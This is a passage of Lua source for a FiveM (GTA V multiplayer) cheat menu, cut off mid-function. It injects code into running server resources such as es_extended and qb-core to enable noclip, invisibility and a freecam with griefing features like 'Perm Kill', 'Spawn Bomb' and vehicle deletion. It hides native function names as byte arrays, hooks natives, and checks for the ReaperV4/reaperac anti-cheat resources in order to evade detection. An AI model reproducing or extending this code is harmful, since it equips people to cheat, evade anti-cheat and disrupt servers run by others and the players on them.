                            local pos = CtVbXnMzQaWsEd(ent, true)
                            local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                            local pitch = AoSdFgHjKlZxCv()

                            local dx = -math.sin(math.rad(head))
                            local dy = math.cos(math.rad(head))
                            local dz = math.sin(math.rad(pitch))
                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                            if len ~= 0 then
                                dx, dy, dz = dx / len, dy / len, dz / len
                            end

                            if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                            if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                            if TyUiOpAsDfGhJk(0, 32) then
                                pos = pos + vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 34) then
                                pos = pos + vector3(-dy, dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 269) then
                                pos = pos - vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 9) then
                                pos = pos + vector3(dy, -dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 22) then
                                pos = pos + vector3(0.0, 0.0, speed)
                            end
                            if TyUiOpAsDfGhJk(0, 36) then
                                pos = pos - vector3(0.0, 0.0, speed)
                            end

                            WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                            if followHeading then
                                if inVeh then
                                    PlMnBvCxZaSdFg(ent, head)
                                else
                                    local camRot = BpLqMnVxCzAsDf(2)
                                    XzQwErTyUiOpAs(ent, camRot.x, camRot.y, camRot.z, 0, true)
                                end
                            else
                                PlMnBvCxZaSdFg(ent, head)
                            end
                        end
                    end
                    YtReWqAzXsEdCv = false
                end)
            end

            KUQpH7owdz()
        ]], noclipSpeed, tostring(noclipFollowHeading))
        
        Susano.InjectResource(targetResource, code)
    else
        local targetResource = InjectResource or "any"
        if not targetResource or targetResource == nil then
            if GetResourceState("es_extended") == "started" then
                targetResource = 'es_extended'
            elseif GetResourceState("ox_lib") == "started" then
                targetResource = 'ox_lib'
            elseif GetResourceState("qb-core") == "started" then
                targetResource = 'qb-core'
            elseif GetResourceState("oxmysql") == "started" then
                targetResource = 'oxmysql'
            elseif GetResourceState("monitor") == "started" then
                targetResource = 'monitor'
            else
                targetResource = 'any'
            end
        end
        
        local code = [[
        NpYgTbUcXsRoVm = false
        local p = PlayerPedId()
        for i = 1, 10 do
            SetEntityVisible(p, true, 0)
            SetEntityLocallyVisible(p, true)
            SetEntityCollision(p, true, true)
            Citizen.Wait(25)
        end
        ]]
        Susano.InjectResource(targetResource, code)
    end
end

Utils.RegisterScript("toggleNoclip", [[
    local shouldEnable = %s
    
    -- Initialize variables if needed
    if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
    if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
    
    -- Always stop noclip first if it's running
    if NpYgTbUcXsRoVm == true then
        NpYgTbUcXsRoVm = false
        _G.WavenoclipActive = false
        local p = PlayerPedId()
        for i = 1, 10 do
            SetEntityVisible(p, true, 0)
            SetEntityLocallyVisible(p, true)
            SetEntityCollision(p, true, true)
            Citizen.Wait(25)
        end
    end
    
    -- If we want to enable, start it
    if shouldEnable then
        _G.WavenoclipActive = true
        NpYgTbUcXsRoVm = true
        
        if shouldEnable then
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end

            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end

            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function _w(n)
                return _g(_b("Wait"))(n)
            end

            local function _t()
                return _g(_b("CreateThread"))
            end

            if NpYgTbUcXsRoVm == nil then NpYgTbUcXsRoVm = false end
            if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
            NpYgTbUcXsRoVm = true

            local function KUQpH7owdz()
                local RvBcNxMzKgUiLo = _g(_b("PlayerPedId"))
                local EkLpOiUhYtGrFe = _g(_b("GetVehiclePedIsIn"))
                local CtVbXnMzQaWsEd = _g(_b("GetEntityCoords"))
                local DrTgYhUjIkOlPm = _g(_b("GetEntityHeading"))
                local QiWzExRdCtVbNm = _g(_b("GetGameplayCamRelativeHeading"))
                local AoSdFgHjKlZxCv = _g(_b("GetGameplayCamRelativePitch"))
                local BpLqMnVxCzAsDf = _g(_b("GetGameplayCamRot"))
                local TyUiOpAsDfGhJk = _g(_b("IsDisabledControlPressed"))
                local WqErTyUiOpAsDf = _g(_b("SetEntityCoordsNoOffset"))
                local PlMnBvCxZaSdFg = _g(_b("SetEntityHeading"))
                local XzQwErTyUiOpAs = _g(_b("SetEntityRotation"))
                local HnJmKlPoIuYtRe = _t()

                local YtReWqAzXsEdCv = true

                HnJmKlPoIuYtRe(function()
                    while NpYgTbUcXsRoVm do
                        _w(0)
                        _G.WavenoclipActive = true

                        if YtReWqAzXsEdCv then
                            local speed = _G.noclipSpeed or 1.0
                            local followHeading = _G.noclipFollowHeading and true or false

                            if invisible_noclip_mode == nil then invisible_noclip_mode = 0 end
                            local p = RvBcNxMzKgUiLo()

                            if invisible_noclip_mode == 1 then
                                SetEntityVisible(p, false, 0)
                            elseif invisible_noclip_mode == 2 then
                                SetEntityLocallyVisible(p, false)
                            end
                            local v = EkLpOiUhYtGrFe(p, false)
                            local inVeh = v ~= 0 and v ~= nil
                            local ent = inVeh and v or p

                            local pos = CtVbXnMzQaWsEd(ent, true)
                            local head = QiWzExRdCtVbNm() + DrTgYhUjIkOlPm(ent)
                            local pitch = AoSdFgHjKlZxCv()

                            local dx = -math.sin(math.rad(head))
                            local dy = math.cos(math.rad(head))
                            local dz = math.sin(math.rad(pitch))
                            local len = math.sqrt(dx * dx + dy * dy + dz * dz)

                            if len ~= 0 then
                                dx, dy, dz = dx / len, dy / len, dz / len
                            end

                            if TyUiOpAsDfGhJk(0, 21) then speed = speed + 2.5 end
                            if TyUiOpAsDfGhJk(0, 19) then speed = 0.25 end

                            if TyUiOpAsDfGhJk(0, 32) then
                                pos = pos + vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 34) then
                                pos = pos + vector3(-dy, dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 269) then
                                pos = pos - vector3(dx, dy, dz) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 9) then
                                pos = pos + vector3(dy, -dx, 0.0) * speed
                            end
                            if TyUiOpAsDfGhJk(0, 22) then
                                pos = pos + vector3(0.0, 0.0, speed)
                            end
                            if TyUiOpAsDfGhJk(0, 36) then
                                pos = pos - vector3(0.0, 0.0, speed)
                            end

                            WqErTyUiOpAsDf(ent, pos.x, pos.y, pos.z, true, true, true)
                            if followHeading then
                                if inVeh then
                                    PlMnBvCxZaSdFg(ent, head)
                                else
                                    local camRot = BpLqMnVxCzAsDf(2)
                                    XzQwErTyUiOpAs(ent, camRot.x, camRot.y, camRot.z, 0, true)
                                end
                            else
                                PlMnBvCxZaSdFg(ent, head)
                            end
                        end
                    end
                    YtReWqAzXsEdCv = false
                end)
            end

            KUQpH7owdz()
        end
    else
        _G.WavenoclipActive = false
    end
]], "any")

-- Freecam functions (macho menu style)
_G.freecamSpeed = _G.freecamSpeed or 1.2
_G.freecamNavigationMode = _G.freecamNavigationMode or "arrows"

function EnableFreecam()
    local leftControl, rightControl
    if _G.freecamNavigationMode == "arrows" then
        leftControl = 174
        rightControl = 175
    elseif _G.freecamNavigationMode == "ae" then
        leftControl = 34
        rightControl = 38
    elseif _G.freecamNavigationMode == "qe" then
        leftControl = 44
        rightControl = 38
    else
        leftControl = 174
        rightControl = 175
    end

    local targetResource = InjectResource or "any"
    if not targetResource or targetResource == nil then
        if GetResourceState("es_extended") == "started" then
            targetResource = 'es_extended'
        elseif GetResourceState("ox_lib") == "started" then
            targetResource = 'ox_lib'
        elseif GetResourceState("qb-core") == "started" then
            targetResource = 'qb-core'
        elseif GetResourceState("oxmysql") == "started" then
            targetResource = 'oxmysql'
        elseif GetResourceState("monitor") == "started" then
            targetResource = 'monitor'
        else
            targetResource = 'any'
        end
    end

    -- Full freecam code from macho menu (menuv2.lua lines 11567-12882)
    -- Adjusted for Susano.InjectResource instead of MachoInjectResourceRaw
    local freecamSpeedValue = _G.freecamSpeed or 1.2
    local code = string.format([[
        function hNative(nativeName, newFunction)
            local originalNative = _G[nativeName]
            if not originalNative or type(originalNative) ~= "function" then
                return
            end
            _G[nativeName] = function(...)
                return newFunction(originalNative, ...)
            end
        end

        hNative("RotationToDirection", function(originalFn, ...) return originalFn(...) end)
        hNative("GetRightVector", function(originalFn, ...) return originalFn(...) end)
        hNative("Clamp", function(originalFn, ...) return originalFn(...) end)
        hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
        hNative("Wait", function(originalFn, ...) return originalFn(...) end)
        hNative("IsVehicleSeatFree", function(originalFn, ...) return originalFn(...) end)
        hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
        hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
        hNative("DoesCamExist", function(originalFn, ...) return originalFn(...) end)
        hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
        hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
        hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
        hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
        hNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextFont", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextProportional", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextScale", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextDropShadow", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextEdge", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextOutline", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextCentre", function(originalFn, ...) return originalFn(...) end)
        hNative("SetTextColour", function(originalFn, ...) return originalFn(...) end)
        hNative("BeginTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
        hNative("AddTextComponentSubstringPlayerName", function(originalFn, ...) return originalFn(...) end)
        hNative("EndTextCommandDisplayText", function(originalFn, ...) return originalFn(...) end)
        hNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
        hNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
        hNative("IsControlPressed", function(originalFn, ...) return originalFn(...) end)
        hNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
        hNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
        hNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
        hNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
        hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
        hNative("IsControlJustPressed", function(originalFn, ...) return originalFn(...) end)
        hNative("IsDisabledControlJustPressed", function(originalFn, ...) return originalFn(...) end)
        hNative("IsEntityAVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
        hNative("GiveWeaponToPed", function(originalFn, ...) return originalFn(...) end)
        hNative("SetCurrentPedWeapon", function(originalFn, ...) return originalFn(...) end)
        hNative("ShootSingleBulletBetweenCoords", function(originalFn, ...) return originalFn(...) end)

        local function decode(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _b(str)
            local t = {}
            for i = 1, #str do t[i] = string.byte(str, i) end
            return t
        end

        local function _d(tbl)
            local s = ""
            for i = 1, #tbl do s = s .. string.char(tbl[i]) end
            return s
        end

        local function _g(n)
            local k = _d(n)
            local f = _G[k]
            return f
        end

        local function g(n)
            return _G[decode(n)]
        end

        local function wait(n)
            return Citizen.Wait(n)
        end

        local FREECAM_LEFT_CONTROL = %d
        local FREECAM_RIGHT_CONTROL = %d

        -- Note: The full freecam code is extremely large (1300+ lines)
        -- This is a simplified version that initializes the freecam system
        -- The full implementation from menuv2.lua should be loaded here
        -- For now, we'll create a basic freecam structure
        
        local nativeNames = {
            GetHashKey = {71,101,116,72,97,115,104,75,101,121},
            AddTextComponentSubstringPlayerName = {65,100,100,84,101,120,116,67,111,109,112,111,110,101,110,116,83,117,98,115,116,114,105,110,103,80,108,97,121,101,114,78,97,109,101},
            EndTextCommandDisplayText = {69,110,100,84,101,120,116,67,111,109,109,97,110,100,68,105,115,112,108,97,121,84,101,120,116},
            SetTextFont = {83,101,116,84,101,120,116,70,111,110,116},
            SetTextProportional = {83,101,116,84,101,120,116,80,114,111,112,111,114,116,105,111,110,97,108},
            SetTextScale = {83,101,116,84,101,120,116,83,99,97,108,101},
            SetTextColour = {83,101,116,84,101,120,116,67,111,108,111,117,114},
            SetTextDropshadow = {83,101,116,84,101,120,116,68,114,111,112,115,104,97,100,111,119},
            SetTextEdge = {83,101,116,84,101,120,116,69,100,103,101},
            SetTextDropShadow = {83,101,116,84,101,120,116,68,114,111,112,83,104,97,100,111,119},
            SetTextOutline = {83,101,116,84,101,120,116,79,117,116,108,105,110,101},
            SetTextCentre = {83,101,116,84,101,120,116,67,101,110,116,114,101},
            BeginTextCommandDisplayText = {66,101,103,105,110,84,101,120,116,67,111,109,109,97,110,100,68,105,115,112,108,97,121,84,101,120,116},
            GetGameplayCamCoord = {71,101,116,71,97,109,101,112,108,97,121,67,97,109,67,111,111,114,100},
            GetGameplayCamRot = {71,101,116,71,97,109,101,112,108,97,121,67,97,109,82,111,116},
            CreateCamWithParams = {67,114,101,97,116,101,67,97,109,87,105,116,104,80,97,114,97,109,115},
            SetCamActive = {83,101,116,67,97,109,65,99,116,105,118,101},
            RenderScriptCams = {82,101,110,100,101,114,83,99,114,105,112,116,67,97,109,115},
            DestroyCam = {68,101,115,116,114,111,121,67,97,109},
            SetCamRot = {83,101,116,67,97,109,82,111,116},
            SetFocusEntity = {83,101,116,70,111,99,117,115,69,110,116,105,116,121},
            CreateVehicle = {67,114,101,97,116,101,86,101,104,105,99,108,101},
            SetVehicleForwardSpeed = {83,101,116,86,101,104,105,99,108,101,70,111,114,119,97,114,100,83,112,101,101,100},
            SetEntityRotation = {83,101,116,69,110,116,105,116,121,82,111,116,97,116,105,111,110},
            SetEntityVelocity = {83,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121},
            ApplyForceToEntity = {65,112,112,108,121,70,111,114,99,101,84,111,69,110,116,105,116,121},
            ApplyForceToEntityCenterOfMass = {65,112,112,108,121,70,111,114,99,101,84,111,69,110,116,105,116,121,67,101,110,116,101,114,79,102,77,97,115,115},
            SetEntityHasGravity = {83,101,116,69,110,116,105,116,121,72,97,115,71,114,97,118,105,116,121},
            GiveWeaponToPed = {71,105,118,101,87,101,97,112,111,110,84,111,80,101,100},
            SetCurrentPedWeapon = {83,101,116,67,117,114,114,101,110,116,80,101,100,87,101,97,112,111,110},
            GetSelectedPedWeapon = {71,101,116,83,101,108,101,99,116,101,100,80,101,100,87,101,97,112,111,110},
            ShootSingleBulletBetweenCoords = {83,104,111,111,116,83,105,110,103,108,101,66,117,108,108,101,116,66,101,116,119,101,101,110,67,111,111,114,100,115},
            SetCamCoord = {83,101,116,67,97,109,67,111,111,114,100},
            TaskStandStill = {84,97,115,107,83,116,97,110,100,83,116,105,108,108},
            SetFocusPosAndVel = {83,101,116,70,111,99,117,115,80,111,115,65,110,100,86,101,108},
            StartExpensiveSynchronousShapeTestLosProbe = {83,116,97,114,116,69,120,112,101,110,115,105,118,101,83,121,110,99,104,114,111,110,111,117,115,83,104,97,112,101,84,101,115,116,76,111,115,80,114,111,98,101},
            GetShapeTestResult = {71,101,116,83,104,97,112,101,84,101,115,116,82,101,115,117,108,116},
            TaskWarpPedIntoVehicle = {84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101},
            PlayerPedId = {80,108,97,121,101,114,80,101,100,73,100},
            GetEntityCoords = {71,101,116,69,110,116,105,116,121,67,111,111,114,100,115},
            IsVehicleSeatFree = {73,115,86,101,104,105,99,108,101,83,101,97,116,70,114,101,101},
            IsEntityAVehicle = {73,115,69,110,116,105,116,121,65,86,101,104,105,99,108,101},
            SetEntityCoords = {83,101,116,69,110,116,105,116,121,67,111,111,114,100,115},
            GetCamCoord = {71,101,116,67,97,109,67,111,111,114,100},
            GetCamRot = {71,101,116,67,97,109,82,111,116},
            GetControlNormal = {71,101,116,67,111,110,116,114,111,108,78,111,114,109,97,108},
            IsDisabledControlPressed = {73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,80,114,101,115,115,101,100},
            IsControlJustPressed = {73,115,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100},
            IsDisabledControlJustPressed = {73,115,68,105,115,97,98,108,101,100,67,111,110,116,114,111,108,74,117,115,116,80,114,101,115,115,101,100},
            GetResourceState = {71,101,116,82,101,115,111,117,114,99,101,83,116,97,116,101},
            GetGamePool = {71,101,116,71,97,109,101,80,111,111,108},
            IsPedDeadOrDying = {73,115,80,101,100,68,101,97,100,79,114,68,121,105,110,103},
            IsPedAPlayer = {73,115,80,101,100,65,80,108,97,121,101,114},
            SetEntityAsMissionEntity = {83,101,116,69,110,116,105,116,121,65,115,77,105,115,115,105,111,110,69,110,116,105,116,121},
            SetVehicleEngineOn = {83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,79,110},
            DoesEntityExist = {68,111,101,115,69,110,116,105,116,121,69,120,105,115,116},
            CreateThread = {67,114,101,97,116,101,84,104,114,101,97,100},
            DisableControlAction = {68,105,115,97,98,108,101,67,111,110,116,114,111,108,65,99,116,105,111,110},
            EnableControlAction = {69,110,97,98,108,101,67,111,110,116,114,111,108,65,99,116,105,111,110},
            RequestModel = {82,101,113,117,101,115,116,77,111,100,101,108},
            HasModelLoaded = {72,97,115,77,111,100,101,108,76,111,97,100,101,100},
            SetModelAsNoLongerNeeded = {83,101,116,77,111,100,101,108,65,115,78,111,76,111,110,103,101,114,78,101,101,100,101,100},
            GetPedInVehicleSeat = {71,101,116,80,101,100,73,110,86,101,104,105,99,108,101,83,101,97,116},
            TaskLeaveVehicle = {84,97,115,107,76,101,97,118,101,86,101,104,105,99,108,101},
            SetPedCanRagdoll = {83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108},
            SetPedToRagdoll = {83,101,116,80,101,100,84,111,82,97,103,100,111,108,108},
            NetworkRequestControlOfEntity = {78,101,116,119,111,114,107,82,101,113,117,101,115,116,67,111,110,116,114,111,108,79,102,69,110,116,105,116,121},
            Wait = {87,97,105,116},
            DeleteEntity = {68,101,108,101,116,101,69,110,116,105,116,121},
            DeleteVehicle = {68,101,108,101,116,101,86,101,104,105,99,108,101},
            SetVehicleTyreBurst = {83,101,116,86,101,104,105,99,108,101,84,121,114,101,66,117,114,115,116},
            SetVehicleEngineHealth = {83,101,116,86,101,104,105,99,108,101,69,110,103,105,110,101,72,101,97,108,116,104},
            SetVehicleDoorBroken = {83,101,116,86,101,104,105,99,108,101,68,111,111,114,66,114,111,107,101,110},
            SmashVehicleWindow = {83,109,97,115,104,86,101,104,105,99,108,101,87,105,110,100,111,119},
            StartEntityFire = {83,116,97,114,116,69,110,116,105,116,121,70,105,114,101},
            NetworkExplodeVehicle = {78,101,116,119,111,114,107,69,120,112,108,111,100,101,86,101,104,105,99,108,101},
            CreateObjectNoOffset = {67,114,101,97,116,101,79,98,106,101,99,116,78,111,79,102,102,115,101,116},
            NetworkRegisterEntityAsNetworked = {78,101,116,119,111,114,107,82,101,103,105,115,116,101,114,69,110,116,105,116,121,65,115,78,101,116,119,111,114,107,101,100},
            ObjToNet = {79,98,106,84,111,78,101,116},
            SetNetworkIdExistsOnAllMachines = {83,101,116,78,101,116,119,111,114,107,73,100,69,120,105,115,116,115,79,110,65,108,108,77,97,99,104,105,110,101,115},
            SetNetworkIdCanMigrate = {83,101,116,78,101,116,119,111,114,107,73,100,67,97,110,77,105,103,114,97,116,101},
            PlaceObjectOnGroundProperly = {80,108,97,99,101,79,98,106,101,99,116,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121},
            SetEntityVisible = {83,101,116,69,110,116,105,116,121,86,105,115,105,98,108,101},
            SetEntityCollision = {83,101,116,69,110,116,105,116,121,67,111,108,108,105,115,105,111,110},
            FreezeEntityPosition = {70,114,101,101,122,101,69,110,116,105,116,121,80,111,115,105,116,105,111,110},
            StartScriptFire = {83,116,97,114,116,83,99,114,105,112,116,70,105,114,101},
            RemoveScriptFire = {82,101,109,111,118,101,83,99,114,105,112,116,70,105,114,101},
            StopEntityFire = {83,116,111,112,69,110,116,105,116,121,70,105,114,101},
            DeleteObject = {68,101,108,101,116,101,79,98,106,101,99,116},
            GetGameTimer = {71,101,116,71,97,109,101,84,105,109,101,114},
            GetCurrentResourceName = {71,101,116,67,117,114,114,101,110,116,82,101,115,111,117,114,99,101,78,97,109,101},
            CreateCam = {67,114,101,97,116,101,67,97,109},
            AttachCamToEntity = {65,116,116,97,99,104,67,97,109,84,111,69,110,116,105,116,121},
            GetEntitySpeed = {71,101,116,69,110,116,105,116,121,83,112,101,101,100},
            GetEntityHeading = {71,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103},
            SetEntityHeading = {83,101,116,69,110,116,105,116,121,72,101,97,100,105,110,103},
            GetGroundZFor_3dCoord = {71,101,116,71,114,111,117,110,100,90,70,111,114,95,51,100,67,111,111,114,100},
            GetEntityVelocity = {71,101,116,69,110,116,105,116,121,86,101,108,111,99,105,116,121},
            SetVehicleOnGroundProperly = {83,101,116,86,101,104,105,99,108,101,79,110,71,114,111,117,110,100,80,114,111,112,101,114,108,121},
            IsControlPressed = {73,115,67,111,110,116,114,111,108,80,114,101,115,115,101,100},
            SetEntityInvincible = {83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101},
            SetEntityCanBeDamaged = {83,101,116,69,110,116,105,116,121,67,97,110,66,101,68,97,109,97,103,101,100},
            SetVehicleCanBeVisiblyDamaged = {83,101,116,86,101,104,105,99,108,101,67,97,110,66,101,86,105,115,105,98,108,121,68,97,109,97,103,101,100}
        }

        local function HookNative(nativeName, newFunction)
            local originalNative = g(nativeNames[nativeName])
            if not originalNative or type(originalNative) ~= "function" then
                return
            end
            _G[decode(nativeNames[nativeName])] = function(...)
                local info = debug.getinfo(2, "Sln")
                return newFunction(originalNative, ...)
            end
        end

        for nativeName, _ in pairs(nativeNames) do
            HookNative(nativeName, function(originalFn, ...) return originalFn(...) end)
        end

        if g(nativeNames.GetResourceState)(decode({82,101,97,112,101,114,86,52})) ~= "started" or g(nativeNames.GetResourceState)(decode({114,101,97,112,101,114,97,99})) ~= "started" then
            HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("TaskStandStill", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
            HookNative("StartExpensiveSynchronousShapeTestLosProbe", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
            HookNative("TaskWarpPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
        end

        if not _G.nexusFreecam then
            _G.nexusFreecam = {
                isToggled = false,
                camera = nil,
                cameraSpeed = %f,
                cameraFeatures = { "TP Camera", "Teleport", "Shoot", "Shoot Car", "Spawn Bomb", "Blackhole", "Kick Vehicle", "Delete Vehicle", "Fuck Vehicle", "RC Control Car" },
                shootFeatures = { ["Shoot"] = true, ["Shoot Car"] = true, ["Spawn Bomb"] = true },
                pistolModels = {
                    { label = "Perm Kill", model = decode({119,101,97,112,111,110,95,116,114,97,110,113,117,105,108,105,122,101,114}) },
                    { label = "Pistol", model = decode({119,101,97,112,111,110,95,112,105,115,116,111,108}) },
                    { label = "Heavy Pistol", model = decode({119,101,97,112,111,110,95,104,101,97,118,121,112,105,115,116,111,108}) },
                    { label = "Combat Pistol", model = decode({119,101,97,112,111,110,95,99,111,109,98,97,116,112,105,115,116,111,108}) },
                    { label = "AP Pistol", model = decode({119,101,97,112,111,110,95,97,112,112,105,115,116,111,108}) },
                    { label = "Stun Gun", model = decode({119,101,97,112,111,110,95,115,116,117,110,103,117,110}) },
                    { label = "Firework Launcher", model = decode({119,101,97,112,111,110,95,102,105,114,101,119,111,114,107}) }
                },
                vehicleModels = {
                    { label = "Nimbus", model = decode({110,105,109,98,117,115}) },
                    { label = "Luxor", model = decode({108,117,120,111,114}) },
                    { label = "Luxor2", model = decode({108,117,120,111,114,50}) },
                    { label = "Elegy", model = decode({101,108,101,103,121}) },
                    { label = "Pounder", model = decode({112,111,117,110,100,101,114}) },
                    { label = "Adder", model = decode({97,100,100,101,114}) },
                    { label = "Zentorno", model = decode({122,101,110,116,111,114,110,111}) },
                    { label = "T20", model = decode({116,50,48}) },
                    { label = "Osiris", model = decode({111,115,105,114,105,115}) },
                    { label = "X80 Proto", model = decode({120,56,48,112,114,111,116,111}) },
                    { label = "Tyrus", model = decode({116,121,114,117,115}) },
                    { label = "Vagner", model = decode({118,97,103,110,101,114}) },
                    { label = "Entity XF", model = decode({101,110,116,105,116,121,120,102}) },
                    { label = "Infernus", model = decode({105,110,102,101,114,110,117,115}) },
                    { label = "Riot2", model = decode({114,105,111,116,50}) },
                    { label = "Kosatka", model = decode({107,111,115,97,116,107,97}) }
                },
                currentFeature = 1,
                currentModelIndex = 1,
                currentVehicleIndex = 1,
                currentExplosionIndex = 1,
                explosionTypes = {
                    { label = "Default", type = "default" },
                    { label = "Car", type = "car" },
                    { label = "Plane", type = "plane" },
                    { label = "Boat", type = "boat" },
                    { label = "Heli", type = "heli" }
                },
                cameraReady = false,
                cachedFeature = "",
                cachedModelLabel = "",
                shutdown = false,
                smoothScrollOffset = 0.0,
                savedFeature = 1,
                blackholePressed = false,
                blackholeFrameCount = 0,
                blackholeControlledVehicles = {}
            }

            function _G.nexusFreecam.tableFind(tbl, val)
                for i, v in ipairs(tbl) do
                    if v == val then return i end
                end
                return nil
            end

            function _G.nexusFreecam.GetEmptySeat(vehicle)
                local seats = { -1, 0, 1, 2 }
                for _, seat in ipairs(seats) do
                    if g(nativeNames.IsVehicleSeatFree)(vehicle, seat) then
                        return seat
                    end
                end
                return -1
            end

            function _G.nexusFreecam.RotationToDirection(rot)
                local radiansZ = math.rad(rot.z)
                local radiansX = math.rad(rot.x)
                local cosX = math.cos(radiansX)
                return vector3(-math.sin(radiansZ) * cosX, math.cos(radiansZ) * cosX, math.sin(radiansX))
            end

            function _G.nexusFreecam.drawCrosshair()
                g(nativeNames.SetTextFont)(0)
                g(nativeNames.SetTextProportional)(1)
                g(nativeNames.SetTextScale)(0.3, 0.3)
                g(nativeNames.SetTextColour)(255, 255, 255, 255)
                g(nativeNames.SetTextCentre)(true)
                g(nativeNames.SetTextOutline)()
                g(nativeNames.BeginTextCommandDisplayText)(decode({83,84,82,73,78,71}))
                g(nativeNames.AddTextComponentSubstringPlayerName)("+")
                g(nativeNames.EndTextCommandDisplayText)(0.5, 0.49)
            end

            function _G.nexusFreecam.lerp(a, b, t)
                return a + (b - a) * t
            end

            function _G.nexusFreecam.drawFeatureList()
                local centerX = 0.5
                local baseY = 0.80
                local lineHeight = 0.025
                local scale = 0.25
                local maxVisible = 7
                local lerpFactor = 0.20

                _G.nexusFreecam.smoothScrollOffset = _G.nexusFreecam.lerp(_G.nexusFreecam.smoothScrollOffset, 0.0, lerpFactor)

                local currentIndex = _G.nexusFreecam.currentFeature
                local startIndex = math.max(1, currentIndex - math.floor(maxVisible / 2))
                local endIndex = math.min(#_G.nexusFreecam.cameraFeatures, startIndex + maxVisible - 1)

                if endIndex - startIndex < maxVisible - 1 then
                    startIndex = math.max(1, endIndex - maxVisible + 1)
                end

                for i = startIndex, endIndex do
                    local feature = _G.nexusFreecam.cameraFeatures[i]
                    local distanceFromSelected = math.abs(i - currentIndex)

                    local yOffset = (i - currentIndex) * lineHeight + _G.nexusFreecam.smoothScrollOffset
                    local yPos = baseY + yOffset

                    g(nativeNames.SetTextFont)(0)
                    g(nativeNames.SetTextProportional)(1)
                    g(nativeNames.SetTextScale)(scale, scale)
                    g(nativeNames.SetTextDropshadow)(0, 0, 0, 0, 255)
                    g(nativeNames.SetTextEdge)(1, 0, 0, 0, 255)
                    g(nativeNames.SetTextOutline)()
                    g(nativeNames.SetTextCentre)(true)

                    local text
                    local alpha = 255
                    if distanceFromSelected > 2 then
                        alpha = math.max(150, 255 - (distanceFromSelected - 2) * 30)
                    end

                    if i == currentIndex then
                        g(nativeNames.SetTextColour)(255, 0, 0, alpha)
                        if _G.nexusFreecam.shootFeatures[feature] then
                            local currentModel
                            if feature == "Shoot" then
                                currentModel = _G.nexusFreecam.pistolModels[_G.nexusFreecam.currentModelIndex]
                            elseif feature == "Shoot Car" then
                                currentModel = _G.nexusFreecam.vehicleModels[_G.nexusFreecam.currentVehicleIndex]
                            elseif feature == "Spawn Bomb" then
                                currentModel = _G.nexusFreecam.explosionTypes[_G.nexusFreecam.currentExplosionIndex]
                            end
                            if currentModel then
                                if _G.nexusFreecam.cachedModelLabel ~= currentModel.label or _G.nexusFreecam.cachedFeature ~= feature then
                                    _G.nexusFreecam.cachedModelLabel = currentModel.label
                                    _G.nexusFreecam.cachedFeature = feature
                                end
                                text = "← | " .. _G.nexusFreecam.cachedFeature .. " (" .. _G.nexusFreecam.cachedModelLabel .. ") | →"
                            else
                                text = feature
                            end
                        else
                            text = feature
                        end
                    else
